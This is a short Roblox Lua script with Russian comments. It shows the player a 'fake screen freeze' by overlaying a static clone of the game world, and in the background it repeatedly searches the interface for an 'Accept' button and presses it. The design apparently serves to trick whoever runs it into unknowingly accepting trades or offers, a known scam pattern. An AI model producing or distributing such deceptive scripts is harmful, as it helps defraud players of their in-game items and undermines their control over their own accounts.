local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- ==== ФЕЙКОВОЕ ЗАВИСАНИЕ ЭКРАНА ====
local function freezeScreen()
    local gui = Instance.new("ScreenGui")
    gui.IgnoreGuiInset = true
    gui.Parent = PlayerGui

    local viewport = Instance.new("ViewportFrame")
    viewport.Size = UDim2.new(1, 0, 1, 0)
    viewport.BackgroundTransparency = 0
    viewport.BackgroundColor3 = Color3.new(0, 0, 0)
    viewport.Parent = gui

    local camera = Instance.new("Camera")
    camera.Parent = viewport
    viewport.CurrentCamera = camera

    local worldClone = workspace:Clone()
    worldClone.Parent = viewport

    camera.CFrame = workspace.CurrentCamera.CFrame

    -- Блокируем ввод (визуально)
    gui.DisplayOrder = 999999
end

-- ==== ПОИСК И НАЖАТИЕ ACCEPT ====
local function autoAccept()
    while true do
        for _, obj in ipairs(PlayerGui:GetDescendants()) do
            if obj:IsA("TextButton") then
                if string.lower(obj.Text) == "accept" then
                    if obj.Visible and obj.Active then
                        pcall(function()
                            obj:Activate()
                        end)
                        print("✅ Accept нажата")
                        return
                    end
                end
            end
        end
        task.wait(0.2)
    end
end

-- ==== ЗАПУСК ====
task.delay(20, function()
    freezeScreen()
end)

task.spawn(autoAccept)


